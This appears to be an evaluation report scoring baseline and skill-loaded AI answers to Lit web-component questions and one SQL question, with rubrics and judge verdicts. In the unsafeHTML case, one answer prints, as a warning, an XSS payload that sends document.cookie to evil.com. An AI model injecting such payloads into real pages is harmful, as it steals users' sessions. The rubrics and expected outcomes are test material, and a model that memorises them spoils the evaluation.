# Eval report: `lit`

- Cases: **6**
- Expectations met: **3/6** (skill_wins 1/4, skill_wins_strict 1/1, tie 1/1)
- Judge: skill won **2**, baseline won **0**, ties **4**
- Rubric pass-rate (over 5 scored case(s)): baseline **100%**, skill **100%** (Δ **+0%**)
- CLI cost: **$0.41** (judge cost not counted)

## Cases

| Case | Expected | Met | Judge | Baseline rubric | Skill rubric |
| --- | --- | --- | --- | --- | --- |
| `array-mutation-no-rerender` | skill_wins | ✗ | **tie** | 100% | 100% |
| `typed-event-cross-shadow` | skill_wins | ✗ | **tie** | 100% | 100% |
| `lifecycle-which-callback` | skill_wins | ✗ | **tie** | 100% | 100% |
| `state-vs-property` | skill_wins | ✓ | **skill** | 100% | 100% |
| `simplest-render-html` | skill_wins_strict | ✓ | **skill** | 100% | 100% |
| `offtopic-sql-join` | tie | ✓ | **tie** | 0% | 0% |

## Per-case detail

### `array-mutation-no-rerender`

**Expected:** `skill_wins` · **Met:** ✗ — **[FAILED EXPECTATION]**

**Prompt**

```
I have a Lit component with a property `@property({type: Array}) items = []`.
When I push a new item with `this.items.push(newItem)`, the
component doesn't re-render. What am I doing wrong?
```

**Judge:** **tie** — Both answers are excellent and cover all three rubric criteria: reference equality explanation, new array recommendation, and requestUpdate as an escape hatch. Answer A provides slightly more depth on why Lit works this way and mentions hasChanged more cleanly, while Answer B includes a useful code snippet showing Lit's internal comparison logic and mentions concat as an alternative. Both are highly idiomatic and correct.

**Per-criterion verdict (judge)**

| Criterion | Better |
| --- | --- |
| explains reference equality / strict equality | tie |
| recommends creating a new array | tie |
| mentions requestUpdate as escape hatch | tie |

**Baseline rubric**

| Criterion | Pass | Evidence |
| --- | --- | --- |
| explains reference equality / strict equality | ✓ | `reference equal` |
| recommends creating a new array | ✓ | `[...this.items` |
| mentions requestUpdate as escape hatch | ✓ | `requestUpdate` |

**Skill rubric**

| Criterion | Pass | Evidence |
| --- | --- | --- |
| explains reference equality / strict equality | ✓ | `strict equal` |
| recommends creating a new array | ✓ | `[...this.items` |
| mentions requestUpdate as escape hatch | ✓ | `requestUpdate` |

<details><summary>Baseline answer</summary>

# Why Your Lit Component Isn't Re-rendering

This is a very common Lit pitfall! The issue is that **Lit uses reference equality (`===`) by default to detect property changes**. When you call `this.items.push(newItem)`, you're mutating the existing array — the reference stays the same, so Lit doesn't know anything changed.

## The Fix: Create a New Array Reference

Instead of mutating the array, replace it with a new one:

```js
// ❌ Doesn't trigger re-render (mutation)
this.items.push(newItem);

// ✅ Triggers re-render (new reference)
this.items = [...this.items, newItem];

// ✅ Also works
this.items = this.items.concat(newItem);
```

The same applies to other mutating methods like `pop()`, `splice()`, `sort()`, `shift()`, `unshift()`, etc. Use their immutable equivalents:

```js
// Remove an item
this.items = this.items.filter(item => item.id !== idToRemove);

// Update an item
this.items = this.items.map(item =>
  item.id === targetId ? { ...item, updated: true } : item
);

// Sort
this.items = [...this.items].sort();
```

## Why This Happens

Lit's reactive update mechanism does roughly this when you set a property:

```js
if (newValue !== oldValue) {
  this.requestUpdate(propName, oldValue);
}
```

For arrays and objects, `===` compares references, not contents. Mutating in place keeps the same reference, so the check passes silently.

## Alternative: Force an Update Manually

If you really need to mutate (e.g., for performance with very large arrays), you can manually request an update:

```js
this.items.push(newItem);
this.requestUpdate('items');
```

However, the immutable approach is strongly recommended because:
- It's predictable and easier to reason about
- It plays well with `PureComponent`-style optimizations
- It avoids subtle bugs when passing `items` to child components that also rely on reference equality

## Bonus: Custom `hasChanged`

If you have a legitimate reason to track deep changes, you can override `hasChanged`:

```js
@property({
  type: Array,
  hasChanged(newVal, oldVal) {
    return JSON.stringify(newVal) !== JSON.stringify(oldVal);
  }
})
items = [];
```

But this is rarely the right answer — stick with immutable updates whenever possible.

</details>

<details><summary>Skill-loaded answer</summary>

# The Problem: Lit Doesn't Detect In-Place Mutations

Lit's reactivity system only triggers a re-render when a property's **reference changes**. Under the hood, Lit compares the old and new values using `===` (strict equality). When you call `this.items.push(newItem)`, you're mutating the existing array, so the reference stays the same — Lit sees no change and skips the update.

## The Fix: Replace the Array with a New Reference

Instead of mutating, create a new array:

```js
// ❌ Doesn't trigger a re-render
this.items.push(newItem);

// ✅ Triggers a re-render
this.items = [...this.items, newItem];
```

The same applies to other mutating operations:

```js
// Removing an item
this.items = this.items.filter(item => item.id !== id);

// Updating an item
this.items = this.items.map(item =>
  item.id === id ? { ...item, ...changes } : item
);

// Sorting (slice() first to avoid mutating the original)
this.items = [...this.items].sort(compareFn);
```

## Why Lit Works This Way

Lit deliberately avoids deep-watching objects and arrays (unlike Vue 2 or MobX) because:
1. **Performance** — no proxies or dirty-checking on every property access.
2. **Predictability** — you always know exactly when an update is triggered.
3. **Immutability friendliness** — encourages patterns that play well with `repeat` directives, memoization, and shouldUpdate logic.

## Escape Hatches (Use Sparingly)

If you really need to mutate in place — e.g., for performance with very large arrays — you can manually request an update:

```js
this.items.push(newItem);
this.requestUpdate('items');
```

You can also customize change detection with `hasChanged`:

```js
@property({
  type: Array,
  hasChanged: () => true,   // always consider it changed
})
items = [];
```

But in the vast majority of cases, **reassigning with a new array is the idiomatic Lit pattern** — it keeps your code simple, your renders predictable, and works seamlessly with directives like `repeat()` for keyed list updates.

</details>

---

### `typed-event-cross-shadow`

**Expected:** `skill_wins` · **Met:** ✗ — **[FAILED EXPECTATION]**

**Prompt**

```
I'm dispatching a CustomEvent from inside my Lit component, but
the parent component listening for it isn't receiving the event.
The parent is just outside the host element. What's wrong?
```

**Judge:** **tie** — Both answers correctly identify composed:true and bubbles:true as required to cross Shadow DOM boundaries, explain the Shadow DOM boundary issue clearly, and provide practical code examples. Answer A adds a typed helper method and more sanity checks, while Answer B adds useful notes about event.composedPath() and encapsulation hygiene. Neither mentions typed Event subclasses with static readonly type (the bonus criterion), so they're essentially equal on the rubric criteria.

**Per-criterion verdict (judge)**

| Criterion | Better |
| --- | --- |
| identifies composed:true is required | tie |
| mentions bubbles:true | tie |
| mentions Shadow DOM boundary | tie |

**Baseline rubric**

| Criterion | Pass | Evidence |
| --- | --- | --- |
| identifies composed:true is required | ✓ | `composed: true` |
| mentions bubbles:true | ✓ | `bubbles: true` |
| mentions Shadow DOM boundary | ✓ | `shadow DOM boundary` |

**Skill rubric**

| Criterion | Pass | Evidence |
| --- | --- | --- |
| identifies composed:true is required | ✓ | `composed: true` |
| mentions bubbles:true | ✓ | `bubbles: true` |
| mentions Shadow DOM boundary | ✓ | `Shadow DOM Boundary` |

<details><summary>Baseline answer</summary>

# CustomEvents from Lit Components Not Reaching Parent

This is one of the most common gotchas in Lit (and web components in general). By default, `CustomEvent` does **not** bubble, and even if you make it bubble, it won't cross the shadow DOM boundary unless you explicitly tell it to.

## The Fix

You need to set both `bubbles: true` and `composed: true` when constructing the event:

```js
this.dispatchEvent(new CustomEvent('my-event', {
  detail: { value: 42 },
  bubbles: true,
  composed: true,
}));
```

## Why Both Are Needed

| Option | What it does |
|---|---|
| `bubbles: true` | Allows the event to propagate up the DOM tree (instead of firing only on the target). |
| `composed: true` | Allows the event to cross shadow DOM boundaries into the light DOM where the parent lives. |

Without `composed: true`, the event will bubble *within* your component's shadow root and then stop at the shadow boundary — so any listener on the host element or above it will never see it.

## Quick Sanity Checks

If it still doesn't work after adding those flags, verify:

1. **Event name match** — Listener name must match exactly (e.g. `@my-event` in a Lit parent template, or `addEventListener('my-event', ...)`).
2. **Listener attached early enough** — If you're attaching imperatively, make sure the child element exists in the DOM before you attach.
3. **Not stopped en route** — Check that no intermediate element calls `stopPropagation()` or `stopImmediatePropagation()`.
4. **Custom event naming** — Lit convention is to use lowercase, hyphenated names (`item-selected`, not `itemSelected`) since DOM event names are case-insensitive in HTML attributes.

## Recommended Pattern

Wrap dispatching in a small helper to avoid forgetting the flags:

```js
private _emit<T>(name: string, detail?: T) {
  this.dispatchEvent(new CustomEvent<T>(name, {
    detail,
    bubbles: true,
    composed: true,
  }));
}
```

Then call `this._emit('item-selected', { id })` wherever you need to notify the outside world.

Add `{ bubbles: true, composed: true }` and the parent should start receiving the event immediately.

</details>

<details><summary>Skill-loaded answer</summary>

# CustomEvent Not Crossing Shadow DOM Boundary

This is one of the most common gotchas in Lit (and Web Components in general). By default, a `CustomEvent` will **not** cross shadow DOM boundaries, even if it bubbles. You need to explicitly opt in.

## The Fix

When you dispatch the event, set both `bubbles: true` and `composed: true`:

```js
this.dispatchEvent(new CustomEvent('my-event', {
  detail: { value: 42 },
  bubbles: true,
  composed: true,   // 👈 this is the key
}));
```

## Why?

- **`bubbles: true`** — lets the event propagate up the DOM tree.
- **`composed: true`** — allows the event to escape the shadow root and be observable in the light DOM (i.e., by your parent component).

Without `composed: true`, the event will bubble *inside* your component's shadow root but stop dead at the shadow boundary. The parent listener never sees it.

## Quick Checklist

1. ✅ Are you setting `composed: true`?
2. ✅ Are you setting `bubbles: true`?
3. ✅ Is the parent listener attached to the host element (or an ancestor), not something inside the shadow root?
4. ✅ If you're re-dispatching, remember `event.target` will be retargeted to your host element from outside the shadow root — `event.composedPath()` gives you the original path.

## A Note on Naming & Semantics

For events that represent *internal implementation details*, consider keeping `composed: false` and only re-dispatching a public-facing event. This is good encapsulation hygiene — but for most user-facing events (clicks, value changes, etc.), `composed: true` is what you want.

```js
// Public, crosses shadow boundary
this.dispatchEvent(new CustomEvent('value-changed', {
  detail: { value: this.value },
  bubbles: true,
  composed: true,
}));
```

That should get your parent listener firing again.

</details>

---

### `lifecycle-which-callback`

**Expected:** `skill_wins` · **Met:** ✗ — **[FAILED EXPECTATION]**

**Prompt**

```
In a Lit component, where should I put each kind of work:
(a) compute a derived property from this.someInput before render,
(b) one-time DOM measurement of a child element after first render,
(c) calling an external API after every render that changed an input.
Which lifecycle method for each, and why?
```

**Judge:** **tie** — Both answers are essentially equivalent in quality, correctly mapping all three tasks to willUpdate, firstUpdated, and updated with clear explanations. Both mention the changedProperties parameter with practical guard examples, explain the ordering rationale, and include helpful summary tables. Neither answer has a meaningful advantage over the other in accuracy, completeness, or clarity.

**Per-criterion verdict (judge)**

| Criterion | Better |
| --- | --- |
| mentions willUpdate | tie |
| mentions firstUpdated | tie |
| mentions updated | tie |
| mentions changedProperties parameter | tie |

**Baseline rubric**

| Criterion | Pass | Evidence |
| --- | --- | --- |
| mentions willUpdate | ✓ | `willUpdate` |
| mentions firstUpdated | ✓ | `firstUpdated` |
| mentions updated | ✓ | `updated(` |
| mentions changedProperties parameter | ✓ | `changedProperties` |

**Skill rubric**

| Criterion | Pass | Evidence |
| --- | --- | --- |
| mentions willUpdate | ✓ | `willUpdate` |
| mentions firstUpdated | ✓ | `firstUpdated` |
| mentions updated | ✓ | `updated(` |
| mentions changedProperties parameter | ✓ | `changedProperties` |

<details><summary>Baseline answer</summary>

# Lit Component Lifecycle: Where to Put Each Kind of Work

## (a) Compute a derived property from `this.someInput` before render

**Use `willUpdate(changedProperties)`**

```js
willUpdate(changedProperties) {
  if (changedProperties.has('someInput')) {
    this.derivedValue = expensiveCompute(this.someInput);
  }
}
```

**Why:** `willUpdate` runs *before* `render()` on every update cycle. Setting reactive properties here is cheap — it does **not** trigger another update. It's specifically designed for computing derived state from inputs so `render()` can use it synchronously. Doing this in `render()` itself would recompute on every render even when `someInput` hasn't changed; doing it in `updated()` would be too late and would force a second render.

## (b) One-time DOM measurement of a child element after first render

**Use `firstUpdated(changedProperties)`**

```js
firstUpdated() {
  const child = this.renderRoot.querySelector('.target');
  this.childWidth = child.getBoundingClientRect().width;
}
```

**Why:** `firstUpdated` fires exactly once, after the component's DOM is rendered for the first time. The shadow DOM (and thus child elements) is guaranteed to exist, so measurements are safe. Using `connectedCallback` would be too early (DOM not rendered yet); using `updated` would needlessly run on every update.

## (c) Calling an external API after every render that changed an input

**Use `updated(changedProperties)`**

```js
updated(changedProperties) {
  if (changedProperties.has('someInput')) {
    fetch(`/api/data?q=${this.someInput}`)
      .then(r => r.json())
      .then(data => { this.data = data; }); // safely triggers re-render
  }
}
```

**Why:** `updated` runs after every render (including the first), and `changedProperties` lets you gate the side effect to only when the relevant input actually changed. It's the right place for side effects involving external systems or DOM that's just been committed. Setting reactive state here is safe — it will schedule a new update rather than invalidate the current one (unlike `willUpdate`, where you should avoid async side effects).

---

## Quick mental model

| Hook | Timing | Use for |
|------|--------|---------|
| `willUpdate` | Before render, every update | **Derived state** from inputs (sync, no side effects) |
| `render` | Returns template | Pure description of UI |
| `firstUpdated` | After first DOM commit, once | **One-time** DOM setup/measurement |
| `updated` | After every DOM commit | **Side effects** (API calls, manual DOM, observers) |

The guiding principle: **`willUpdate` = compute, `render` = describe, `updated` = react.**

</details>

<details><summary>Skill-loaded answer</summary>

# Lit Component Lifecycle Placement

Here's where each kind of work belongs, and why:

## (a) Compute a derived property from `this.someInput` before render

**Use `willUpdate(changedProperties)`**

```js
willUpdate(changedProperties) {
  if (changedProperties.has('someInput')) {
    this.derived = expensiveTransform(this.someInput);
  }
}
```

**Why:** `willUpdate` runs *before* `render()` as part of the same update cycle. Setting reactive properties here does **not** trigger another update, so it's the safe, idiomatic spot for derived state. Avoid `update()` for this — it's lower-level and you'd have to remember to call `super.update()`. Avoid doing it inside `render()` itself, since `render()` should be a pure function of state.

## (b) One-time DOM measurement of a child element after first render

**Use `firstUpdated(changedProperties)`**

```js
firstUpdated() {
  const { width } = this.renderRoot
    .querySelector('.target')
    .getBoundingClientRect();
  this._measuredWidth = width;
}
```

**Why:** `firstUpdated` fires exactly once, after the component's DOM has been rendered and is queryable via `this.renderRoot` / `this.shadowRoot`. It's the canonical hook for one-time setup that depends on rendered children — measuring, attaching third-party libraries to an element, focusing an input, etc. `connectedCallback` runs too early (no DOM yet), and `updated` runs every time (wasteful for one-time work).

## (c) Call an external API after every render that changed an input

**Use `updated(changedProperties)`**

```js
updated(changedProperties) {
  if (changedProperties.has('query')) {
    fetch(`/api/search?q=${encodeURIComponent(this.query)}`)
      .then(r => r.json())
      .then(data => { this.results = data; }); // triggers another update
  }
}
```

**Why:** `updated` runs after every render commit, and `changedProperties` lets you gate the side effect to only the inputs that actually changed (avoiding redundant fetches). It's the right place for *post-render side effects* — DOM reads/writes, network calls, dispatching events — and it's safe to set reactive properties here (they'll schedule a new update without causing an infinite loop, as long as you guard with `changedProperties.has(...)`).

## Quick summary

| Phase | Hook | Use it for |
|---|---|---|
| Pre-render, same cycle | `willUpdate` | Derived state from inputs |
| Post-render, once | `firstUpdated` | Initial DOM measurement/setup |
| Post-render, every change | `updated` | Side effects keyed off `changedProperties` |

The mental model: **`willUpdate` shapes what you render, `firstUpdated`/`updated` react to what you rendered.**

</details>

---

### `state-vs-property`

**Expected:** `skill_wins` · **Met:** ✓

**Prompt**

```
In Lit, when should I use @state() versus @property() on a class
field? I'm a bit unclear on the distinction.
```

**Judge:** **skill** — Both answers are excellent and cover all three rubric criteria well. Answer B edges out A by including a practical 'common gotcha' section about mutation vs. reassignment, which adds concrete, actionable value beyond the core distinction. Both answers are equally clear on @property as public/attribute-synced, @state as internal/no-attribute, and reactive re-rendering, but B's additional tip makes it more useful for real-world usage.

**Per-criterion verdict (judge)**

| Criterion | Better |
| --- | --- |
| identifies @property as public API / attribute-synced | tie |
| identifies @state as internal / no attribute | tie |
| mentions reactive trigger / re-render | tie |

**Baseline rubric**

| Criterion | Pass | Evidence |
| --- | --- | --- |
| identifies @property as public API / attribute-synced | ✓ | `public` |
| identifies @state as internal / no attribute | ✓ | `Internal` |
| mentions reactive trigger / re-render | ✓ | `trigger a re-render` |

**Skill rubric**

| Criterion | Pass | Evidence |
| --- | --- | --- |
| identifies @property as public API / attribute-synced | ✓ | `public` |
| identifies @state as internal / no attribute | ✓ | `internal` |
| mentions reactive trigger / re-render | ✓ | `Triggers a re-render` |

<details><summary>Baseline answer</summary>

# `@state()` vs `@property()` in Lit

Both decorators make a class field **reactive** (changes trigger a re-render), but they differ in their **public API surface**:

## `@property()` — Public, External API

Use this when the field is part of the component's **public interface** and should be settable from outside the element.

- Exposed as an **HTML attribute** (by default) — e.g., `<my-element name="Alice">`
- Synced between the JS property and the DOM attribute
- Configurable: `type`, `attribute`, `reflect`, `converter`, etc.
- Should be considered part of your component's contract

```ts
@property({ type: String })
name = '';

@property({ type: Number, reflect: true })
count = 0;
```

## `@state()` — Private, Internal State

Use this for **internal** reactive state that consumers of the element shouldn't know or care about.

- **No** associated HTML attribute
- Not part of the public API
- Triggers re-renders just like `@property()`
- Safe to rename/remove without breaking consumers
- Minifiers/closure compiler can mangle the name

```ts
@state()
private _isOpen = false;

@state()
private _fetchedData: User[] = [];
```

## Quick Decision Guide

| Question | Use |
|---|---|
| Should a parent component / HTML author set this? | `@property()` |
| Is it derived from props, fetched data, UI state (open/closed, hover, etc.)? | `@state()` |
| Should it appear as an attribute in the DOM? | `@property()` (with `reflect: true` if you want JS→attr sync) |
| Is it private implementation detail? | `@state()` |

## Rule of Thumb

> Start with `@state()`. Only "promote" a field to `@property()` when you have a concrete reason to expose it externally.

This keeps your public API minimal and your refactors safer.

</details>

<details><summary>Skill-loaded answer</summary>

# `@state()` vs `@property()` in Lit

The distinction comes down to **whether the field is part of your component's public API**.

## `@property()` — Public, reactive, externally settable

Use this when the field should be settable from outside the component (HTML attributes or parent components):

```ts
@property({ type: String })
name = 'world';

@property({ type: Number })
count = 0;
```

Key behaviors:
- **Reflected to/from an HTML attribute** by default, so `<my-el name="Alice">` works.
- Part of the component's documented public API.
- Triggers a re-render when changed.
- Supports converters (`type: Number`, `type: Boolean`, etc.) and `reflect: true` to push changes back to the attribute.

## `@state()` — Private, reactive, internal only

Use this for internal reactive state that shouldn't be controlled from outside:

```ts
@state()
private _isOpen = false;

@state()
private _fetchedData?: User[];
```

Key behaviors:
- **No associated attribute** — can't be set via markup.
- Not part of the public API (conventionally prefixed with `_` and marked `private`).
- Still triggers a re-render when changed.
- Renamed/minified safely by build tools, since it isn't observed externally.

## Quick decision guide

| Question | Use |
|---|---|
| Should a parent set this via an HTML attribute? | `@property()` |
| Should a parent set this via a JS property? | `@property()` |
| Is it derived from a fetch, timer, internal toggle, etc.? | `@state()` |
| Could exposing it lock you into an API contract you don't want? | `@state()` |

## Common gotcha

If you put `@property()` on something that holds an object/array and mutate it in place (e.g. `this.items.push(x)`), Lit won't detect the change — you need to reassign (`this.items = [...this.items, x]`). The same applies to `@state()`. Reactivity is triggered by **identity changes**, not deep mutation, regardless of which decorator you used.

## Rule of thumb

> Default to `@state()` for anything internal. Only "promote" a field to `@property()` when you have a real reason for the outside world to control it.

This keeps your component's API surface small and intentional.

</details>

---

### `simplest-render-html`

**Expected:** `skill_wins_strict` · **Met:** ✓

**Prompt**

```
Inside my Lit component's render() method, I want to insert some
user-controlled HTML I just received from an API as a string.
What's the simplest way to render it?
```

**Judge:** **skill** — Both answers correctly identify unsafeHTML and warn about XSS, but Answer B provides more depth and accuracy. Notably, B explicitly clarifies that Shadow DOM is NOT a security boundary (a common misconception), mentions Trusted Types as an additional defense layer, and provides more concrete XSS payload examples. Both avoid recommending raw innerHTML and both mention unsafeHTML with appropriate warnings, but B's additional nuance around Shadow DOM security and Trusted Types makes it more complete and accurate.

**Per-criterion verdict (judge)**

| Criterion | Better |
| --- | --- |
| warns about XSS / sanitization | skill |
| avoids recommending raw innerHTML | tie |
| mentions unsafeHTML directive (if recommending it) | tie |

**Baseline rubric**

| Criterion | Pass | Evidence |
| --- | --- | --- |
| warns about XSS / sanitization | ✓ | `XSS` |
| avoids recommending raw innerHTML | ✓ | |
| mentions unsafeHTML directive (if recommending it) | ✓ | `unsafeHTML` |

**Skill rubric**

| Criterion | Pass | Evidence |
| --- | --- | --- |
| warns about XSS / sanitization | ✓ | `XSS` |
| avoids recommending raw innerHTML | ✓ | |
| mentions unsafeHTML directive (if recommending it) | ✓ | `unsafeHTML` |

<details><summary>Baseline answer</summary>

# Rendering raw HTML in Lit

Lit deliberately escapes any string you interpolate into an `html` template, so this won't work:

```js
render() {
  return html`<div>${this.apiHtml}</div>`; // renders as escaped text
}
```

To inject HTML as actual markup, use the built-in **`unsafeHTML`** directive:

```js
import { LitElement, html } from 'lit';
import { unsafeHTML } from 'lit/directives/unsafe-html.js';

class MyEl extends LitElement {
  static properties = { apiHtml: { type: String } };

  render() {
    return html`<div>${unsafeHTML(this.apiHtml)}</div>`;
  }
}
```

## ⚠️ But please don't do this with user-controlled HTML

The directive is named `unsafeHTML` for a reason — passing untrusted strings straight in is a textbook XSS vulnerability. A payload like `<img src=x onerror="...">` will execute in your component's shadow root.

The simplest *safe* version is to sanitize first, e.g. with [DOMPurify](https://github.com/cure53/DOMPurify):

```js
import DOMPurify from 'dompurify';
import { unsafeHTML } from 'lit/directives/unsafe-html.js';

render() {
  const clean = DOMPurify.sanitize(this.apiHtml);
  return html`<div>${unsafeHTML(clean)}</div>`;
}
```

A few alternatives worth considering depending on your use case:

- **If it's really just text**, drop `unsafeHTML` entirely — `${this.apiHtml}` is already safe.
- **If it's Markdown**, render it via a markdown library that outputs sanitized HTML (e.g. `marked` + DOMPurify, or `markdown-it` with HTML disabled).
- **If you need strong isolation**, render it inside a sandboxed `<iframe sandbox>` so scripts can't touch your page.

Short answer: `unsafeHTML(...)` from `lit/directives/unsafe-html.js` — wrapped around a sanitizer.

</details>

<details><summary>Skill-loaded answer</summary>

# Rendering HTML strings in Lit

The direct answer is Lit's `unsafeHTML` directive:

```js
import { html, LitElement } from 'lit';
import { unsafeHTML } from 'lit/directives/unsafe-html.js';

class MyEl extends LitElement {
  render() {
    return html`<div>${unsafeHTML(this.apiHtml)}</div>`;
  }
}
```

By default, Lit treats interpolated strings as text content (escaping them), so `${this.apiHtml}` would render the markup as visible text rather than parsing it. `unsafeHTML` parses the string as HTML and inserts the resulting nodes.

## ⚠️ But please don't do this with user-controlled HTML

The directive is named `unsafeHTML` for a reason — it's an XSS sink. If the string contains anything like:

```html
<img src=x onerror="fetch('https://evil.com/?c=' + document.cookie)">
<script>...</script>
<a href="javascript:...">click</a>
```

…it will execute in your app's origin. Lit's Shadow DOM does **not** protect you here; Shadow DOM is an encapsulation boundary, not a security boundary. Scripts inside a shadow root run with full access to the page.

### Safer alternatives

1. **Sanitize first.** Run the HTML through [DOMPurify](https://github.com/cure53/DOMPurify) before handing it to `unsafeHTML`:
   ```js
   import DOMPurify from 'dompurify';
   // ...
   return html`<div>${unsafeHTML(DOMPurify.sanitize(this.apiHtml))}</div>`;
   ```
   Configure the allow-list to be as narrow as your use case permits.

2. **Render structured data instead of HTML.** If you control the API, return JSON describing the content and build the template with normal Lit interpolation — no sanitization needed.

3. **Use a sandboxed `<iframe srcdoc>`** with a restrictive `sandbox` attribute (e.g. `sandbox=""` to disable scripts) if you need to display arbitrary third-party HTML in isolation.

4. **Trusted Types.** If you're deploying with a `require-trusted-types-for 'script'` CSP, you'll need to produce a `TrustedHTML` value (typically via DOMPurify's `RETURN_TRUSTED_TYPE` option) before `unsafeHTML` will accept it — a good belt-and-braces signal that sanitization happened.

So: `unsafeHTML` is the simplest mechanism, but pair it with sanitization (or pick a safer approach) whenever the string originated outside your own code.

</details>

---

### `offtopic-sql-join`

**Expected:** `tie` · **Met:** ✓

**Prompt**

```
What's the difference between INNER JOIN and LEFT JOIN in SQL?
A short example would help.
```

**Judge:** **tie** — Both answers are essentially identical in content, structure, and correctness. They use the same example tables, the same SQL queries, produce the same results, and offer the same rule-of-thumb guidance. Minor wording differences are negligible.

**Per-criterion verdict (judge)**

| Criterion | Better |
| --- | --- |

**Baseline rubric**

_(no rubric)_

**Skill rubric**

_(no rubric)_

<details><summary>Baseline answer</summary>

# INNER JOIN vs LEFT JOIN

**INNER JOIN** returns only rows where there's a match in *both* tables.

**LEFT JOIN** returns *all* rows from the left table, plus matching rows from the right table. Where there's no match, columns from the right table are `NULL`.

## Example

Given these two tables:

**users**
| id | name    |
|----|---------|
| 1  | Alice   |
| 2  | Bob     |
| 3  | Charlie |

**orders**
| id | user_id | item   |
|----|---------|--------|
| 1  | 1       | Book   |
| 2  | 1       | Pen    |
| 3  | 2       | Laptop |

### INNER JOIN

```sql
SELECT u.name, o.item
FROM users u
INNER JOIN orders o ON u.id = o.user_id;
```

Result — Charlie is excluded because he has no orders:

| name  | item   |
|-------|--------|
| Alice | Book   |
| Alice | Pen    |
| Bob   | Laptop |

### LEFT JOIN

```sql
SELECT u.name, o.item
FROM users u
LEFT JOIN orders o ON u.id = o.user_id;
```

Result — Charlie is included with `NULL` for `item`:

| name    | item   |
|---------|--------|
| Alice   | Book   |
| Alice   | Pen    |
| Bob     | Laptop |
| Charlie | NULL   |

## Quick rule of thumb

- Use **INNER JOIN** when you only care about rows that exist in both tables.
- Use **LEFT JOIN** when you want to keep everything from the main table — useful for finding missing relationships (e.g., `WHERE o.id IS NULL` finds users with no orders).

</details>

<details><summary>Skill-loaded answer</summary>

# INNER JOIN vs LEFT JOIN

- **INNER JOIN**: Returns only rows that have matching values in **both** tables.
- **LEFT JOIN** (LEFT OUTER JOIN): Returns **all rows from the left table**, plus matching rows from the right table. Where there's no match, columns from the right table are `NULL`.

## Example

Given these two tables:

**users**
| id | name    |
|----|---------|
| 1  | Alice   |
| 2  | Bob     |
| 3  | Charlie |

**orders**
| id | user_id | item   |
|----|---------|--------|
| 1  | 1       | Book   |
| 2  | 1       | Pen    |
| 3  | 2       | Laptop |

### INNER JOIN

```sql
SELECT u.name, o.item
FROM users u
INNER JOIN orders o ON u.id = o.user_id;
```

Result — Charlie is excluded (no orders):

| name  | item   |
|-------|--------|
| Alice | Book   |
| Alice | Pen    |
| Bob   | Laptop |

### LEFT JOIN

```sql
SELECT u.name, o.item
FROM users u
LEFT JOIN orders o ON u.id = o.user_id;
```

Result — Charlie is included with `NULL`:

| name    | item   |
|---------|--------|
| Alice   | Book   |
| Alice   | Pen    |
| Bob     | Laptop |
| Charlie | NULL   |

## Quick rule of thumb

- Use **INNER JOIN** when you only care about records that exist in both tables.
- Use **LEFT JOIN** when you want everything from the main (left) table, even if the related data is missing — useful for finding things like "users with no orders":

```sql
SELECT u.name
FROM users u
LEFT JOIN orders o ON u.id = o.user_id
WHERE o.id IS NULL;
```

</details>

---
